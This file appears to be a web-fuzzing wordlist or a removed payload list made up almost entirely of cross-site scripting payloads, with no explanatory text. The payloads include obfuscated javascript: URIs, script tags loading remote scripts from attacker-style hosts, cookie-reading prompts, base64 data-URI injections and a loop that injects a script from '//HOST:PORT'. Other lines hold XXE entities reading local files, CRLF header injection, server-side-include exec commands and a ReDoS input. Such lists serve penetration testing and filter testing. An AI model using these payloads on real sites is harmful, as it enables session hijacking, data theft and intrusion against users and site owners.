-<input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>
-&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-%0D%0ALocation:%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D
-<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
-<x 1=">" onxxx=1
-&lt;IMG SRC=\"http&#58;//www&#46;thesiteyouareon&#46;com/somecommand&#46;php?somevariables=maliciouscode\"&gt;
-onmouseover=\u0061\u006C\u0065\u0072\u0074('XSS')
-<sVg oNloaD=write()>
-<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>
-<link REL="stylesheet" HREF="javascript:document.vulnerable=true;">
-onclick
-%CA%BA>%EF%BC%9Csvg/onload%EF%BC%9Dalert%EF%BC%881)>
-</plaintext\></|\><plaintext/onmouseover=prompt(1)
-al\u0065rt(1)
-<x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>
-confirm("test")
-&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;
-&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;
-<x %6Fnxxx=1
-<br><br><br><br><br><br><x id=x>#x
-"'><;(24)trela=daolno ;''=e>'=d
-"alt=
-<;A HREF=";http://0102.0146.0007.00000223/";>;XSS<;/A>;
-alert&#40;1&#41
-&lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt;
-<iframe  src="&Tab;javascript:prompt(1)&Tab;">
-<;SCRIPT>;document.write(";<;SCRI";);<;/SCRIPT>;PT SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
-<svg onload=alert&lpar;1&rpar;>
-&{document.vulnerable=true;};
-&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
-&lt;SCRIPT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;jpg\"&gt;&lt;/SCRIPT&gt;
-<link
-<D3"<"/OncLick="1>[confirm``]"<">z
-alert`1`
-setInterval`alert\x28document.domain\x29`
-&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;
-<base HREF="javascript:document.vulnerable=true;//">
-onerror
-<;A HREF=";http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D";>;XSS<;/A>;
-<iframe src="https://crowdshield.com/.testing/iframe_injection.php?iframe_src=4" height="100%" width="100%"></iframe>//INJECTX
-<;STYLE>;BODY{-moz-binding:url(";http://ha.ckers.org/xssmoz.xml#xss";)}<;/STYLE>;
-"'%253e%253cscript%253econfirm(42)%253c/script%253e
-<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
-'>><marquee><h1>XSS</h1></marquee>
-<img src="livescript:document.vulnerable=true;">
-&lt;IMG&#x0D;SRC&#x0D;=&#x0D;&quot;&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;(&#x0D;&apos;&#x0D;X&#x0D;S&#x0D;S&#x0D;&apos;&#x0D;)&#x0D;&quot;&#x0D;&gt;&#x0D;
-<img src=something onauxclick="new Function `al\ert\`xss\``">
-<details onauxclick=confirm`xss`></details>
-<svg xmlns="http://www.w3.org/2000/svg"><path d="M0,0" style="marker-start:url(test4.svg#a)"/></svg>
-<X OnXxx=1
-&#x00003C
-<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xee;</foo>
-eval(
-&#x0003C;
-javascript:eval('var a=document.createElement(\'script\');a.src=\'https://hackeroneofjaaah.xss.ht\';document.body.appendChild(a)')
-<<scr\0ipt/src=http://xss.com/xss.js></script
-<var onmouseover="prompt(1)">On Mouse Over</var>?
-<iFrAMe/src \/\/onload = prompt(1)
-<div style="x:expression((window.r==1)?'':eval('r=1;
-<?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>
-&lt;LINK REL=\"stylesheet\" HREF=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;css\"&gt;
-&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
-cookie
-<x 1='1'onxxx=1
-exp/*&lt;A STYLE='no\xss&#58;noxss(\"*//*\");
-%252522%252527%25253e%25253cscript%25253econfirm(42)%25253c/script%25253e
-"'><\script>confirm(42)</script>
-eval(a+b+c+d);
-&#X000003C;
-<iframe width="420" height="315" src="https://www.youtube.com/embed/5LlQNty_C8s?autoplay=1" frameborder="0" allowfullscreen></iframe>
-<FRAMESET><FRAME SRC="javascript:document.vulnerable=true;"></frameset>
-<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">
-<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
-&lt;IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041&gt;
-<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
-</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
-<svg onload=alert&#40;1&#41>
-left:\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF14\uFF12\u1450
-<meta/content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg=="http-equiv=refresh>
-&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;&gt;
-&lt;!--[if gte IE 4]&gt;
-'">><marquee><h1>XSS</h1></marquee>
-<iframe/src \/\/onload = prompt(1)
-<svg onpointerenter=z=alert,z(document.domain)>
-<IMG SRC="`<javascript:alert>`('XSS')"
-document
-<img src=http://sn1persecurity.com/.testing/xss.png>//INJECTX REMOTE
-'>
-onmouseover="document.cookie=true;">//INJECTX
-prompt(document.cookie)
-<div style="binding: url(http://www.securitycompass.com/xss.js);"> [Mozilla]
-<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">test</a>
-[\xC0][\xBC]script>document.vulnerable=true;[\xC0][\xBC]/script>
-"><iframe%20src="http://google.com"%%203E
-&lt;SCRIPT a=\"&gt;'&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
-<embed src="data:text/html;base64,%(base64)s">
-<HTML xmlns:xss><?import namespace="xss" implementation="http://www.securitycompass.com/xss.htc"><xss:xss>XSS</xss:xss></html>
-&lt;STYLE&gt;BODY{-moz-binding:url(&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;)}&lt;/STYLE&gt;
-XXX<style>*{color:gre/**/en !/**/important}*{color:red}*{background:url(xx:x //**/\red/*)}</style>
-\u003C
-<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
-<iframe src=%(scriptlet)s <
-&#x3c
-<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
-<;A HREF=";http://ha.ckers.org@google";>;XSS<;/A>;
-<img src="blah>" onmouseover="document.vulnerable=true;">
-'-prompt(8)-'
-&lt;XML SRC=\"xsstest&#46;xml\" ID=I&gt;&lt;/XML&gt;
-"o<x>nmouseover=alert<x>(1)//
-</Script/"'--><Body /Autofocus /OnFocus = confirm`1` <!-->
-&lt;SCRIPT a=&quot;blah&quot; &apos;&apos; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-<marquee/onstart=window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))>
-<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
-&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
-top
-><object+data=//14.rs>
-<x%0Conxxx=1
-&lt;SCRIPT&gt;a=/XSS/
-;
-<object data="data:text/html;base64,%(base64)s">
-';
-<;META HTTP-EQUIV=";Link"; Content=";<;http://ha.ckers.org/xss.css>;; REL=stylesheet";>;
-<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
-&#X03c
-<div style="behaviour: url([link to code]);">
-<h1>INJECTX</h1>
-"-top['al\x65rt']('sailay')-"
-<iframe
-<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
-<div style="font-family:'foo&#10;;color:red;';">LOL
-<x%09onxxx=1
-&lt;IMG SRC=\"mocha&#58;&#91;code&#93;\"&gt;
-<;IMG&#x0D;SRC&#x0D;=&#x0D;";&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;&#x0D;';&#x0D;X&#x0D;S&#x0D;S&#x0D;';&#x0D;)&#x0D;";&#x0D;>;&#x0D;
-&lt;A HREF=\"http&#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\"&gt;XSS&lt;/A&gt;
-<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>?
-&#x0003c
-<div style=content:url(test2.svg)></div><div style="background:url(test5.svg)">PRESS ENTER</div>
-<iframe src="https://crowdshield.com/.testing/xss_vuln.html"></iframe>//INJECTX
-<img src="http://sn1persecurity.com/.testing/xss.png?img_src=2"></img>//INJECTX
-c=\"javascript&#058;\";
-<x onxxx=1 onxxx=1
-<iframe src=TARGET_URL onload="frames[0].postMessage('INJECTION','*')">
-exp/*<XSS STYLE='no\xss:noxss("*//*");
-&#x3008;script&#x3009;
-href="data:text/html;charset=utf-7,+ADw-script+AD4-confirm(42)+ADsAPA-/script+AD4-"	UTF-7
-&#x003c
-&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;
-<div  style="\63&#9\06f&#10\0006c&#12\00006F&#13\R:\000072 Ed;color\0\bla:yellow\0\bla;col\0\00 \&#xA0or:blue;">XXX</div>
-&#X03C
-<![CDATA[
-<body onload!#$%&()*~+-_.,:;?@[/|\]^`=document.vulnerable=true;>
-<iframe src=http://ha.ckers.org/scriptlet.html <
-<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
-&lt;IMG SRC=\"livescript&#058;&#91;code&#93;\"&gt;
-a=alert,a(1)
-<iframe src="view-source:http://www.example.org/" frameborder="0" style="width:400px;height:180px"></iframe><textarea type="text" cols="50" rows="10"></textarea>
-&lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;
-<iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />
-jAvas\Cript:confirm(42)
-\'
-<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe
-&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;
-top[8680439..toString(30)](1)
-<img LOWSRC="javascript:document.vulnerable=true;">
-eval
-<base href=//0>
-<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
-<iframe src="vbscript:document.vulnerable=true;">
-<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
-&#x00003C;
-<body onload=confirm(123) >
-<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
-<div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X
-onload
-"'%u003e%u003cscript%u003econfirm(42)%u003c/script%u003e
-Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser
-<SVg </onlOad ="1> (_=prompt,_(1)) "">
-<svg xmlns="http://www.w3.org/2000/svg"><a id="x"><rect fill="white" width="1000" height="1000"/></a><rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/></svg>
-<index
-<style>BODY{-moz-binding:url("http://www.securitycompass.com/xssmoz.xml#xss")}</style>
-<svg%0Aonload=%09((pro\u006dpt))()//
-<;XSS STYLE=";behavior: url(http://ha.ckers.org/xss.htc);";>;
-href="data:text/html;base64,PHNjcmlwdD5jb25maXJtKDQyKTs8L3NjcmlwdD4="	base64
-<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.vulnerable=true></object>
-<;EMBED SRC=";http://ha.ckers.org/xss.swf"; AllowScriptAccess=";always";>;<;/EMBED>;
-<svg onload\r\n=$.globalEval("al"+"ert()");>
-<a  href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click  Me</a>
-<meta http-equiv="refresh" content="0;url=javascript:document.vulnerable=true;">
-<!-- INJECTX
-<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
-";a=prompt,a()//
-exp/*&lt;XSS STYLE=&apos;no\xss:noxss(&quot;*//*&quot;);
-&#x3C;
-&#X00003C
-&lt;!--#exec cmd=\"/bin/echo '&lt;SCR'\"--&gt;&lt;!--#exec cmd=\"/bin/echo 'IPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;'\"--&gt;
-&#X000003c;
-<!DOCTYPE x[<!ENTITY x SYSTEM "http://html5sec.org/test.xxe">]><y>&x;</y>
-&lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCRIPT SRC&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt;
-&#x2039;script&#x203A;
-<body onmessage=print()>
-'<'/'><'s't'y'l'e'/'o'n'l'o'a'd'='a'l'e'r't('1')'>
-<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
-<;SCRIPT a=";>;"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
-href="data:text/html;charset=utf-7;base64,K0FEdy1zY3JpcHQrQUQ0LWNvbmZpcm0oNDIpK0FEc0FQQS0vc2NyaXB0K0FENC0="	UTF-7 in base64
-onload=
-<embed type="image" src=%(scriptlet)s></embed>
-&lt;A HREF=\"http&#58;//ha&#46;ckers&#46;org@google\"&gt;XSS&lt;/A&gt;
-<div style=content:url(%(svg)s)></div>
-&lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;
-&#x03C
-&lt;LAYER SRC=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/LAYER&gt;
-<iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ?
-&lt;SCRIPT/XSS SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
-&lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;
-<x%2Fonxxx=1
-<form action="" method="post"><input name="username" value="admin" /><input name="password" type="password" value="secret" /><input name="injected" value="injected" dirname="password" /><input type="submit"></form>
-<div STYLE="background-image: url(javascript:document.vulnerable=true;)">
-\";document.vulnerable=true;;//
-<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
-<applet code="javascript:confirm(document.cookie);">
-<p
-&#00060
-<xml id="xss" src="test.htc"></xml><label dataformatas="html" datasrc="#xss" datafld="payload"></label>
-<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
-<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
-"onmouseover
-<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
-location.href=
-]]><![CDATA[ close/complete cdata ]]>
-<image src\r\n=valid.jpg onloadend='new class extends (co\u006efir\u006d)/**/`` &lcub;&rcub;'>
-<div/style="width:expression(confirm(1))">X</div> {IE7}
-\u003c
-<IMG SRC="mocha:[code]">
-INJECTXXXXXXXXXXX
-<br><br><br><br><br><br><br><br><br><br>
-&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data&#58;text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\"&gt;
-&lt;A HREF=\"http&#58;//www&#46;google&#46;com&#46;/\"&gt;XSS&lt;/A&gt;
-&#x3c;
-"'%25u003e%25u003cscript%25u003econfirm(42)%25u003c/script%25u003e
-'';!--\"&lt;XSS&gt;=&{()}
-<;IMG RC=&;#106;&;#97;&;#118;&;#97;&;#115;&;#99;&;#114;&;#105;&;#112;&;#116;&;#58;&;#97;&;#108;&;#101;&;#114;&;#116;&;#40;&;#39;&;#88;&;#83;&;#83;&;#39;&;#41;>;
-<layer
-<EMBED SRC="http://hacker.com/xss.swf" AllowScriptAccess="always">
-<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>
-<;STYLE>;@import';http://ha.ckers.org/xss.css';;<;/STYLE>;
-<style>*[{}@import'%(css)s?]</style>X
-// INJECTX
-http://xss.rocks/scriptlet.html
-<img SRC=" &#14; javascript:document.vulnerable=true;">
-<XSS STYLE="behavior: url(xss.htc);">
-\x3c
-<img SRC="javascript:document.vulnerable=true;"
-<IMG SRC='vbscript:msgbox("XSS")'>
-<div style="background-image: url(javascript:document.vulnerable=true;);">
-<x style="behavior:url(test.sct)">
-<x style="background:url('x&#1;;color:red;/*')">XXX</x>
-<!-- complete comment -->
-<x:script xmlns:x="http://www.w3.org/1999/xhtml" src="//brutelogic.com.br/1.js"/>
-<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
-INJECTXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX